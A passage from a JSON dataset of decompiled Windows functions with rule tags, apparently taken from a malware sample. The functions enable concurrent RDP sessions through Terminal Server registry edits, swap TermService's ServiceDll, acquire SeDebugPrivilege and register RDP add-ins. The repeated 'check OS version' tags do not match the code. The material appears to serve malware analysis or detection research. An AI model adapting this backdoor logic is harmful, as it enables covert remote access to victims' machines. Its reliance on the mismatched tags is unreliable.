        "decompiled_code": "\nuint __cdecl fcn.00410c08(int32_t buf)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = buf;\n    if (buf == 0) {\ncode_r0x00410c3e:\n        uVar2 = 0;\n    }\n    else {\n        do {\n            iVar1 = (*_sym.imp.WS2_32.dll_send)(in_ECX, (in_EDX - iVar3) + buf, iVar3, 0);\n            if (iVar1 == -1) goto code_r0x00410c3e;\n            iVar3 = iVar3 - iVar1;\n        } while (iVar3 != 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00410cce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410d2e)\n\nvoid __cdecl fcn.00410cce(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t lpParameter;\n    uint hObject;\n    uint var_4h;\n    \n    *0x552f4c = arg_8h;\n    lpParameter = fcn.00406f77();\n    fcn.0040415d(&arg_14h);\n    *(lpParameter + 4) = 0xd3d;\n    fcn.0040415d(&arg_ch);\n    *(lpParameter + 0xc) = arg_10h;\n    *(lpParameter + 0x10) = 0x552b78;\n    fcn.00402746(fcn.00410bf5, lpParameter);\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 211
    },
    "00410f97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410f97(uint *arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_48h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t lpData;\n    uint cbData;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t hKey;\n    \n    uVar6 = 0;\n    var_30h = 0;\n    hKey = 0;\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\");\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\Licensing Core\");\n    fcn.0040460a(L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\");\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\AddIns\");\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\ControlTerminal Server\\\\AddIns\\\\Clip Redirector\");\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\AddIns\\\\Dynamic VC\");\n    var_ch = 1;\n    iVar3 = fcn.00414e25(0x80000002, &var_2ch, 0x20106, 1);\n    pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (iVar3 == 0) goto code_r0x004113db;\n    lpData = 0;\n    var_18h = arg_8h == NULL;\n    cbData = 0;\n    fcn.00403fc7(&var_18h, 4);\n    puVar4 = fcn.0040460a(L\"fDenyTSConnections\");\n    iVar3 = lpData;\n    if (hKey == 0) {\n        var_14h = 0;\n    }\n    else {\n        iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 4, lpData, cbData);\n        var_14h = iVar5 == 0;\n    }\n    fcn.00406f1d();\n    if (var_14h == 0) {\ncode_r0x00411083:\n        if (hKey != 0) {\n            (*pcVar2)(hKey);\n        }\n        hKey = 0;\n        goto code_r0x004113cd;\n    }\n    if (iVar3 != 0) {\n        fcn.00406f66();\n    }\n    var_18h = arg_8h;\n    lpData = 0;\n    cbData = 0;\n    fcn.00403fc7(&var_18h, 4);\n    if (hKey != 0) {\n        (*pcVar2)(hKey);\n    }\n    hKey = 0;\n    iVar3 = fcn.00414e25(0x80000002, &var_28h, 0x20106, 1);\n    if (iVar3 == 0) goto code_r0x004113cd;\n    puVar4 = fcn.0040460a(L\"EnableConcurrentSessions\");\n    if (hKey == 0) {\n        var_14h = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 4, lpData, cbData);\n        var_14h = iVar3 == 0;\n    }\n    fcn.00406f1d();\n    if (var_14h == 0) goto code_r0x00411083;\n    if (hKey != 0) {\n        (*pcVar2)(hKey);\n    }\n    hKey = 0;\n    iVar3 = fcn.00414e25(0x80000002, &var_24h, 0x20106, 1);\n    if (iVar3 == 0) goto code_r0x004113cd;\n    puVar4 = fcn.0040460a(L\"AllowMultipleTSSessions\");\n    if (hKey == 0) {\n        var_14h = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 4, lpData, cbData);\n        var_14h = iVar3 == 0;\n    }\n    fcn.00406f1d();\n    if (var_14h == 0) goto code_r0x00411083;\n    if (hKey != 0) {\n        (*pcVar2)(hKey);\n    }\n    hKey = 0;\n    if ((arg_8h == NULL) || (iVar3 = fcn.0041340d(),  iVar3 != 0)) {\ncode_r0x004113cb:\n        uVar6 = 1;\n    }\n    else {\n        iVar3 = fcn.00414e25(0x80000002, &var_10h, 0x20106, 1);\n        if (iVar3 != 0) {\n            if (hKey != 0) {\n                (*pcVar2)(hKey);\n            }\n            hKey = 0;\n            iVar3 = fcn.00414e25(0x80000002, &var_20h, 0x20106, 1);\n            if (iVar3 != 0) {\n                var_40h = 0;\n                var_3ch = 0;\n                arg_8h = 0x3;\n                fcn.00403fc7(&arg_8h, 4);\n                fcn.0040460a(L\"RDPClip\");\n                arg_8h = fcn.0040424e(&var_48h);\n                puVar4 = fcn.0040460a(L\"Name\");\n                if ((hKey == 0) ||\n                   (iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 1, *arg_8h, arg_8h[1]), \n                   iVar3 != 0)) {\n                    bVar1 = false;\ncode_r0x004112aa:\n                    arg_8h = CONCAT13(1, arg_8h._0_3_);\n                    if (bVar1) goto code_r0x004112be;\n                }\n                else {\n                    puVar4 = fcn.0040460a(L\"Type\");\n                    if ((hKey == 0) ||\n                       (iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 4, var_40h, var_3ch), \n                       iVar3 != 0)) {\n                        bVar1 = true;\n                        goto code_r0x004112aa;\n                    }\n                    arg_8h = arg_8h & 0xffffff;\ncode_r0x004112be:\n                    fcn.00406f1d();\n                    var_14h = 0;\n                }\n                fcn.00406f1d();\n                var_18h = 0;\n                fcn.00404081();\n                fcn.00406f1d();\n                if (arg_8h._3_1_ == '\\0') {\n                    if (hKey != 0) {\n                        (*pcVar2)(hKey);\n                    }\n                    hKey = 0;\n                    iVar3 = fcn.00414e25(0x80000002, &var_1ch, 0x20106, 1);\n                    if (iVar3 != 0) {\n                        if (var_40h != 0) {\n                            fcn.00406f66();\n                        }\n                        var_40h = 0;\n                        var_3ch = 0;\n                        arg_8h = 0x1;\n                        fcn.00403fc7(&arg_8h, 4);\n                        puVar4 = fcn.0040460a(L\"Type\");\n                        if (hKey == 0) {\n                            arg_8h = NULL;\n                        }\n                        else {\n                            iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *puVar4, 0, 4, var_40h, var_3ch);\n                            arg_8h = iVar3 == 0;\n                        }\n                        fcn.00406f1d();\n                        if (arg_8h != NULL) {\n                            if (hKey != 0) {\n                                (*pcVar2)(hKey);\n                            }\n                            hKey = 0;\n                            if (var_40h != 0) {\n                                fcn.00406f66();\n                            }\n                            goto code_r0x004113cb;\n                        }\n                        goto code_r0x0041138b;\n                    }\n                    if (hKey != 0) {\n                        (*pcVar2)(hKey);\n                    }\n                    uVar6 = 1;\n                }\n                else {\ncode_r0x0041138b:\n                    if (hKey != 0) {\n                        (*pcVar2)(hKey);\n                    }\n                    uVar6 = 0;\n                    var_ch = 0;\n                }\n                hKey = 0;\n                if (var_40h != 0) {\n                    fcn.00406f66();\n                    uVar6 = var_ch;\n                }\n            }\n        }\n    }\ncode_r0x004113cd:\n    if (lpData != 0) {\n        fcn.00406f66();\n    }\ncode_r0x004113db:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    if (hKey != 0) {\n        (*pcVar2)(hKey);\n    }\n    return uVar6;\n}\n",
        "token_count": 2296
    },
    "0041141f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041141f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    code *pcVar6;\n    bool bVar7;\n    uint var_18h;\n    uint lpSubKey;\n    uint var_ch;\n    int32_t phkResult;\n    \n    uVar5 = 0;\n    phkResult = 0;\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x102, &phkResult);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    pcVar6 = pcVar1;\n    if (iVar2 == 0) {\n        puVar3 = fcn.0040424e(&var_18h);\n        puVar4 = fcn.0040460a(L\"ServiceDll\");\n        if (phkResult == 0) {\n            bVar7 = false;\n        }\n        else {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(phkResult, *puVar4, 0, 2, *puVar3, puVar3[1]);\n            bVar7 = iVar2 == 0;\n        }\n        fcn.00406f1d();\n        var_ch = 0;\n        fcn.00404081();\n        pcVar6 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (bVar7) {\n            if (phkResult != 0) {\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            }\n            phkResult = 0;\n            uVar5 = 1;\n        }\n        else {\n            if (phkResult != 0) {\n                (*pcVar1)(phkResult);\n            }\n            phkResult = 0;\n            pcVar6 = pcVar1;\n        }\n    }\n    fcn.00406f1d();\n    if (phkResult != 0) {\n        (*pcVar6)(phkResult);\n    }\n    return uVar5;\n}\n",
        "token_count": 504
    },
    "004114f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004114f4(int32_t param_1)\n\n{\n    int32_t lpString2;\n    bool bVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    bVar1 = false;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n    if (iVar2 != 0) {\n        lpString2 = param_1 + 0x28;\n        var_28h = 1;\n        do {\n            var_ch = 0;\n            (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)(iVar2, 0, 0x30, 3, 0, 0, &var_10h, &var_4h, &var_ch, 0);\n            uVar5 = var_10h;\n            piVar3 = fcn.00406f77();\n            iVar4 = (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)\n                              (iVar2, 0, 0x30, 3, piVar3, uVar5, &var_10h, &var_4h, &var_ch, 0);\n            if ((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0xea)) break;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            uVar7 = 0;\n            piVar6 = piVar3;\n            if (var_4h == 0) break;\n            while( true ) {\n                if (*piVar6 == 0) goto code_r0x004115da;\n                fcn.0040460a(*piVar6);\n                iVar2 = fcn.00404276(lpString2);\n                if (iVar2 != 0) break;\n                fcn.00406f1d();\n                lpString1 = 0;\n                uVar7 = uVar7 + 1;\n                piVar6 = piVar6 + 0xb;\n                if (var_4h <= uVar7) goto code_r0x004115da;\n            }\n            uVar5 = fcn.0040460a(piVar3[uVar7 * 0xb]);\n            fcn.004043c7(uVar5);\n            fcn.00406f1d();\n            *(param_1 + 0x2c) = piVar3[uVar7 * 0xb + 9];\n            fcn.00406f1d();\n            lpString1 = 0;\n            iVar2 = *(param_1 + 0x2c);\n            if (iVar2 != 0) {\n                var_24h = 0;\n                uVar7 = var_4h;\n                if (var_4h == 0) goto code_r0x004115de;\n                goto code_r0x00411681;\n            }\n            if (bVar1) break;\n            fcn.00410df8(lpString2, 2);\n            fcn.00410e64(lpString2);\n            bVar1 = true;\n            fcn.00401014(piVar3);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n        } while (iVar2 != 0);\n    }\ncode_r0x004115da:\n    var_28h = 0;\n    goto code_r0x004115de;\n    while( true ) {\n        if (piVar3[9] == iVar2) {\n            fcn.0040460a(*piVar3);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(lpString1, 0);\n            if (iVar2 != 0) {\n                iVar2 = *piVar3;\n                fcn.0040460a(iVar2);\n                fcn.00402a5c(iVar2);\n            }\n            fcn.00406f1d();\n            iVar2 = *(param_1 + 0x2c);\n            uVar7 = var_4h;\n        }\n        lpString1 = 0;\n        var_24h = var_24h + 1;\n        piVar3 = piVar3 + 0xb;\n        if (uVar7 <= var_24h) break;\ncode_r0x00411681:\n        lpString1 = 0;\n        if (*piVar3 == 0) break;\n    }\ncode_r0x004115de:\n    fcn.00406f1d();\n    return var_28h;\n}\n",
        "token_count": 1139
    },
    "00411760": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00411760(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char16_t *pcVar6;\n    uint *puVar7;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\");\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    var_24h = 0;\n    var_20h = 0;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, var_14h, 0, 0x20119, &var_4h);\n    pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (iVar4 != 0) goto code_r0x004118e6;\n    puVar7 = &var_24h;\n    pcVar6 = L\"ImagePath\";\n    uVar5 = fcn.0040460a(L\"ImagePath\");\n    iVar4 = fcn.00414d78(uVar5, pcVar6);\n    fcn.00406f1d(uVar5, pcVar6, puVar7);\n    if (iVar4 == 0) {\n        if (var_4h != 0) {\n            (*pcVar2)(var_4h);\n        }\n        var_4h = 0;\n    }\n    else {\n        if (var_4h != 0) {\n            (*pcVar2)(var_4h);\n        }\n        var_4h = 0;\n        fcn.00403f05(&var_8h);\n        if (var_24h != 0) {\n            fcn.00406f66();\n        }\n        pcVar3 = _sym.imp.SHLWAPI.dll_StrStrW;\n        var_24h = 0;\n        var_20h = 0;\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrW)(var_8h, L\"svchost.exe\");\n        if (iVar4 == 0) {\n            iVar4 = (*pcVar3)(var_8h, L\"svchost.exe -k\");\n            if (iVar4 != 0) goto code_r0x00411848;\n        }\n        else {\ncode_r0x00411848:\n            iVar4 = (*pcVar1)(0x80000002, var_10h, 0, 0x20119, &var_4h);\n            if (iVar4 == 0) {\n                pcVar6 = L\"ServiceDll\";\n                uVar5 = fcn.0040460a(L\"ServiceDll\");\n                iVar4 = fcn.00414d78(uVar5, pcVar6);\n                fcn.00406f1d();\n                if (iVar4 != 0) {\n                    fcn.00403f05(&var_1ch);\n                    uVar5 = fcn.00404201();\n                    fcn.004043c7(uVar5);\n                    fcn.00406f1d();\n                    var_ch = 0;\n                    fcn.00406f1d();\n                }\n                if (var_4h != 0) {\n                    (*pcVar2)(var_4h);\n                }\n                var_4h = 0;\n            }\n        }\n        fcn.00406f1d();\n        var_8h = 0;\n    }\n    if (var_24h != 0) {\n        fcn.00406f66();\n    }\ncode_r0x004118e6:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    if (var_4h != 0) {\n        (*pcVar2)(var_4h);\n    }\n    return;\n}\n",
        "token_count": 940
    },
    "0041199f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041199f(void)\n\n{\n    int32_t iVar1;\n    uint lpValueName;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *arg_ch;\n    uint *puVar4;\n    int32_t var_14h;\n    uint var_10h;\n    uint lpSubKey;\n    uint var_8h;\n    int32_t phkResult;\n    \n    uVar3 = 0;\n    phkResult = 0;\n    fcn.0040460a(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_10h = 0;\n    var_14h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    iVar2 = 0;\n    if (iVar1 == 0) {\n        puVar4 = &var_14h;\n        arg_ch = L\"ServiceDll\";\n        lpValueName = fcn.0040460a(L\"ServiceDll\");\n        iVar2 = fcn.00414d78(lpValueName, arg_ch);\n        fcn.00406f1d(lpValueName, arg_ch, puVar4);\n        if (iVar2 == 0) {\n            if (phkResult != 0) {\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            }\n            phkResult = 0;\n            iVar2 = var_14h;\n        }\n        else {\n            fcn.00403f05(&var_8h);\n            uVar3 = fcn.00404276(0x553084);\n            fcn.00406f1d();\n            var_8h = 0;\n            iVar2 = var_14h;\n        }\n    }\n    if (iVar2 != 0) {\n        fcn.00406f66();\n    }\n    fcn.00406f1d();\n    if (phkResult != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return uVar3;\n}\n",
        "token_count": 478
    },
    "00411a69": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00411c19)\n\nuint __fastcall fcn.00411a69(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    int32_t arg_ch;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    uint extraout_ECX_04;\n    int32_t unaff_EBX;\n    uint uVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t in_stack_ffffff74;\n    int32_t arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iStack124;\n    int32_t iStack116;\n    uchar auStack80 [76];\n    \n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar1 = fcn.004138ef();\n    if (iVar1 == 1) {\n        fcn.00413473();\n    }\n    iVar1 = param_1 + 0x38;\n    iStack124 = 0x411aac;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    iStack116 = param_1;\n    if (iVar2 == 0) {\n        iStack124 = 0;\n        uVar3 = extraout_ECX;\n        fcn.00404656(iVar1);\n        fcn.00413fdb(iVar1, uVar3);\n        arg_8h_00 = 0;\n        iVar1 = param_1 + 0x40;\n        in_stack_ffffff74 = extraout_ECX_00;\n        fcn.00404656(iVar1);\n        fcn.00413fdb(iVar1, in_stack_ffffff74);\n        iStack124 = 0;\n        iVar2 = fcn.004138ef();\n        if (iVar2 == 1) {\n            arg_8h = fcn.0041780e(&stack0xffffff98, *(param_1 + 100), 2);\n            fcn.00403eca(arg_8h);\n            fcn.00404081();\n            fcn.00403fc7(arg_8h_00, 0x1c800);\n            iVar2 = arg_8h_00 + 0x1c800;\n            arg_ch = in_stack_ffffff74 + -0x1c800;\n        }\n        else {\n            arg_8h = fcn.0041780e(&stack0xffffff98, *(param_1 + 100), 1);\n            fcn.00403eca(arg_8h);\n            fcn.00404081();\n            fcn.00403fc7(arg_8h_00, 0x12e00);\n            iVar2 = arg_8h_00 + 0x12e00;\n            arg_ch = in_stack_ffffff74 + -0x12e00;\n        }\n        puVar7 = &stack0xffffff58;\n        fcn.00403fc7(iVar2, arg_ch);\n        if (arg_8h_00 == 0) {\n            if (iVar1 != 0) {\n                fcn.00406f66();\n            }\n            if (arg_8h != 0) {\n                fcn.00406f66();\n            }\n            fcn.00413c16();\n            fcn.00413c16();\n            return 0xffffffff;\n        }\n        iVar1 = fcn.00413b2f(extraout_ECX_01, extraout_ECX_01);\n        if (iVar1 != 0) {\n            uVar3 = extraout_ECX_02;\n            fcn.00413ef9(&stack0xffffff58);\n            fcn.00413ee1(puVar7, uVar3);\n        }\n        iStack116 = 0x411bf5;\n        iVar1 = fcn.00413b2f();\n        if (iVar1 != 0) {\n            iStack124 = 0x411c08;\n            fcn.00413ef9(&stack0xffffffb0);\n            iStack124 = 0x411c11;\n            fcn.00413ee1();\n            iStack116 = extraout_ECX_03;\n        }\n        if (unaff_EBX != 0) {\n            iStack124 = 0x411c2b;\n            fcn.00406f66();\n        }\n        iStack124 = 0x411c34;\n        fcn.00413c16();\n        iStack124 = 0x411c3d;\n        fcn.00413c16();\n    }\n    arg_8h_01 = param_1 + 0x3c;\n    iStack124 = *arg_8h_01;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    if (iVar1 == 0) {\n        uVar3 = extraout_ECX_04;\n        fcn.00404656(arg_8h_01);\n        fcn.00413fdb(arg_8h_01, uVar3);\n        in_stack_ffffff74 = 3;\n        fcn.0041780e(&stack0xffffff98, *(param_1 + 100), 3);\n        if (iStack116 == 0) {\n            fcn.00404081();\n            fcn.00413c16();\n            uVar4 = 0xffffffff;\n            goto code_r0x00411e9c;\n        }\n        iVar1 = fcn.00413b2f();\n        if (iVar1 != 0) {\n            fcn.00413ef9(&stack0xffffff84);\n            fcn.00413ee1();\n        }\n        fcn.00404081();\n        fcn.00413c16();\n    }\n    fcn.00411760();\n    fcn.00411747();\n    iVar1 = fcn.004114f4();\n    if (iVar1 == 0) {\n        fcn.0041344c();\n        iVar1 = param_1 + 0x5c;\n        param_1 = 4;\n    }\n    else {\n        iVar1 = fcn.0041141f();\n        if (iVar1 == 0) {\n            fcn.0041344c();\n            iVar1 = param_1 + 0x60;\n            param_1 = param_1 + 0x5c;\n            in_stack_ffffff74 = 6;\n        }\n        else {\n            fcn.004116e4();\n            fcn.0040460a(L\"SeDebugPrivilege\");\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar1 = fcn.004132f4();\n            fcn.00406f1d();\n            if (iVar1 == 0) {\n                fcn.0041344c();\n                iVar1 = param_1 + 0x60;\n                param_1 = param_1 + 0x5c;\n                in_stack_ffffff74 = 3;\n            }\n            else {\n                iVar1 = fcn.00414ac7();\n                pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                if (iVar1 == 0) {\n                    fcn.0041344c();\n                    iVar1 = param_1 + 0x60;\n                    param_1 = param_1 + 0x5c;\n                    in_stack_ffffff74 = 5;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_Sleep)();\n                    if (*(param_1 + 0x4c) != 0) {\n                        uVar5 = 0;\n                        do {\n                            fcn.00406d65();\n                            fcn.00404656(*(param_1 + 0x44) + uVar5 * 4);\n                            fcn.00410e64(&stack0xffffff88);\n                            fcn.00406f1d();\n                            uVar5 = uVar5 + 1;\n                            iStack124 = 0;\n                            pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                        } while (uVar5 < *(param_1 + 0x4c));\n                    }\n                    (*pcVar6)();\n                    fcn.00404656(param_1 + 0x28);\n                    fcn.00410e64(&stack0xffffff84);\n                    fcn.00406f1d();\n                    (*pcVar6)();\n                    iVar1 = fcn.00410f97(1);\n                    if (iVar1 == 0) {\n                        iVar1 = param_1 + 0x60;\n                        param_1 = param_1 + 0x5c;\n                        in_stack_ffffff74 = 7;\n                    }\n                    else {\n                        iVar1 = fcn.004138ef();\n                        if (iVar1 == 1) {\n                            fcn.0041344c();\n                        }\n                        iVar2 = fcn.00411906();\n                        iVar1 = param_1 + 0x60;\n                        param_1 = param_1 + 0x5c;\n                        if (iVar2 != 0) {\n                            uVar4 = fcn.00405b49(0, param_1, iVar1);\n                            fcn.00405f32(uVar4);\n                            fcn.00405b26();\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n                            uVar4 = 8;\n                            goto code_r0x00411e9c;\n                        }\n                        in_stack_ffffff74 = 10;\n                    }\n                }\n            }\n        }\n    }\n    uVar3 = fcn.00405b49(in_stack_ffffff74, param_1, iVar1);\n    fcn.00405f32(uVar3);\n    fcn.00405b26();\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\ncode_r0x00411e9c:\n    if (iStack124 != 0) {\n        fcn.00406f66();\n    }\n    return uVar4;\n}\n",
        "token_count": 2228
    },
    "00411f55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00411f55(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint32_t uVar5;\n    uint uStack20;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x553050);\n    fcn.00413473();\n    iVar3 = fcn.004114f4();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    if (iVar3 != 0) {\n        fcn.0040460a(L\"SeDebugPrivilege\");\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.004132f4();\n        fcn.00406f1d();\n        if (iVar3 != 0) {\n            fcn.00414ac7();\n            (*pcVar1)(1000);\n        }\n    }\n    fcn.0040460a(L\"%SystemRoot%\\\\System32\\\\termsrv.dll\");\n    fcn.0041141f(extraout_ECX);\n    piVar2 = *0x5530a4;\n    uVar4 = fcn.0040460a(L\"rudp\");\n    if (*piVar2 != 0) {\n        fcn.00414d03(uVar4);\n    }\n    fcn.00406f1d();\n    piVar2 = *0x5530a4;\n    uVar4 = fcn.0040460a(L\"rpdp\");\n    if (*piVar2 != 0) {\n        fcn.00414d03(uVar4);\n    }\n    fcn.00406f1d();\n    uVar4 = 0x553088;\n    fcn.00404656(0x553088);\n    fcn.00413c34(uVar4);\n    uVar4 = 0x55308c;\n    fcn.00404656(0x55308c);\n    fcn.00413c34(uVar4);\n    uVar5 = 0;\n    if (*0x55309c != 0) {\n        do {\n            fcn.00406d65();\n            fcn.00404656(*0x553094 + uVar5 * 4);\n            fcn.00410e64(&uStack20);\n            fcn.00406f1d();\n            uStack20 = 0;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < *0x55309c);\n    }\n    (*pcVar1)(500);\n    fcn.00410e64(0x553078);\n    (*pcVar1)(500);\n    fcn.00410f97(0);\n    fcn.0041344c();\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x553050);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 640
    },
    "004120e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
